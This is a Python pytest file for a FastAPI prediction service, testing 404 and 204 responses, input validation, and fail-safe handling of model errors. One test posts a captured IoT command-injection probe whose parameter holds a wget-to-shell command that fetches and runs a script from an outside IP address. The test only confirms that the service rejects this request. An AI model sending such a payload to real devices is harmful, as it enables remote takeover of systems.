import os

import pytest
from fastapi.testclient import TestClient


@pytest.fixture()
def client(monkeypatch):
    # Minimize startup side effects
    monkeypatch.setenv("DISABLE_WARMUP", "true")
    # Avoid forcing micro-batching complexity in tests
    monkeypatch.setenv("MICRO_BATCH_ENABLED", "false")

    from service import main as m

    # Prevent real model loading during app startup
    monkeypatch.setattr(m.model_manager, "ensure_loaded", lambda: None)

    return TestClient(m.app)


def test_root_returns_404_by_default_in_prod(client):
    r = client.get("/")
    assert r.status_code == 404
    body = r.json()
    assert body.get("detail") == "Not Found"


def test_favicon_returns_204(client):
    r = client.get("/favicon.ico")
    assert r.status_code == 204
    assert r.text == ""  # no content


def test_unknown_device_rsp_returns_404(client):
    r = client.post(
        "/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http://45.125.66.56/tbk.sh%20-O-%20|%20sh"
    )
    assert r.status_code == 404
    data = r.json()
    assert "detail" in data


def test_predict_validation_error_422(client):
    # Missing required field 'input'
    r = client.post("/api/predict", json={})
    assert r.status_code == 422


def test_predict_fail_safe_returns_200_empty_on_inference_error(client, monkeypatch):
    from service import main as m

    # Ensure fail-safe is enabled
    monkeypatch.setattr(m, "FAIL_SAFE", True)

    # Model inference raises
    def _boom(text: str):
        raise RuntimeError("model failed")

    monkeypatch.setattr(m.model_manager, "predict", _boom)

    r = client.post("/api/predict", json={"input": "молоко"})
    assert r.status_code == 200
    assert r.json() == []


def test_predict_no_fail_safe_returns_500_on_inference_error(client, monkeypatch):
    from service import main as m

    # Disable fail-safe
    monkeypatch.setattr(m, "FAIL_SAFE", False)

    def _boom(text: str):
        raise RuntimeError("model failed")

    monkeypatch.setattr(m.model_manager, "predict", _boom)

    r = client.post("/api/predict", json={"input": "сыр"})
    assert r.status_code == 500
    data = r.json()
    assert data.get("detail") == "Internal server error"
